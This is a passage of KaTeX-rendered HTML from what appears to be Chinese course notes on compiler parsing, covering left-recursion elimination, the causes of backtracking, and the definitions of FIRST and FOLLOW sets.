class=\"mord\"></span></span><span style=\"top:-3.90248em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.2500000000000004em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span><span style=\"top:-0.5975199999999998em;\"><span class=\"pstrut\" style=\"height:2.99248em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.0549600000000003em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.5549600000000003em;\"><span style=\"top:-5.562480000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.2575200000000004em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span><span style=\"top:-0.6050399999999998em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.99248em;\"><span style=\"top:-2.99248em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.57948em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8278285714285715em;\"><span style=\"top:-2.931em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.0549600000000003em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h4 id=\"回溯消除\"><a class=\"markdownIt-Anchor\" href=\"#回溯消除\"></a> 回溯消除</h4>\n<p>为什么会产生回溯？因为在遇到非终结字符挑选候选式的时候，可能会有多个候选式符合要求。具体有两种情况：</p>\n<ol>\n<li>相同左部的<strong>规则</strong>，产生式右部左端的第一个终结字符相同。</li>\n<li>相同左部的<strong>规则</strong>，其中某一个右部能够推出<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>，在从开始符号<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>的某一个推导中，左部非终结字符的后继符号与其某一个规则的右部的左端相同。</li>\n</ol>\n<p>为了解决这些问题，定义了一些三个特殊集合。</p>\n<h5 id=\"first集合\"><a class=\"markdownIt-Anchor\" href=\"#first集合\"></a> FIRST集合</h5>\n<p>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>是一个不含左递归的文法，对<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的任意一个符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span></span></span></span>，定义其<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi></mrow><annotation encoding=\"application/x-tex\">FIRST</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span></span></span></span>集合。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow><mo>:</mo><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi>s</mi><mi mathvariant=\"normal\">∣</mi><mi>α</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>s</mi><mo>⋯</mo><mo>∧</mo><mi>s</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">FIRST\\left(\\alpha\\right):=\\left\\{s|\\alpha\\stackrel{*}{\\Rightarrow}s\\dots \\land s \\in V_{T} \\right\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.80002em;vertical-align:-0.65002em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">{</span></span><span class=\"mord mathdefault\">s</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">}</span></span></span></span></span></span></span></p>\n<p>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha\\stackrel{*}{\\Rightarrow}\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>，规定<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi><mo>∈</mo><mi>F</mi><mi>I</mi><mi>R</mi><mi>S</mi><mi>T</mi><mrow><mo fence=\"true\">(</mo><mi>α</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\epsilon \\in FIRST\\left(\\alpha\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">ϵ</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">T</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<h5 id=\"follow集合\"><a class=\"markdownIt-Anchor\" href=\"#follow集合\"></a> FOLLOW集合</h5>\n<p>假设<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>是文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>的开始符号，对于<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>中任意非终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，定义其<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">FOLLOW</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span></span></span></span>集合。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>F</mi><mi>O</mi><mi>L</mi><mi>L</mi><mi>O</mi><mi>W</mi><mrow><mo fence=\"true\">(</mo><mi>A</mi><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">{</mo><mi>α</mi><mi mathvariant=\"normal\">∣</mi><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mo>…</mo><mi>A</mi><mi>α</mi><mo>⋯</mo><mo>∧</mo><mi>α</mi><mo>∈</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">}</mo></mrow></mrow><annotation encoding=\"application/x-tex\">FOLLOW\\left(A\\right)=\\left\\{\\alpha|S\\stackrel{*}{\\Rightarrow}\\dots A\\alpha\\dots \\land \\alpha \\in V_{T}\\right\\}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">A</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.80002em;vertical-align:-0.65002em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">{</span></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">⋯</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∧</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size2\">}</span></span></span></span></span></span></span></p>\n<p>若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mo>…</mo><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">S\\stackrel{*}{\\Rightarrow}\\dots A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span 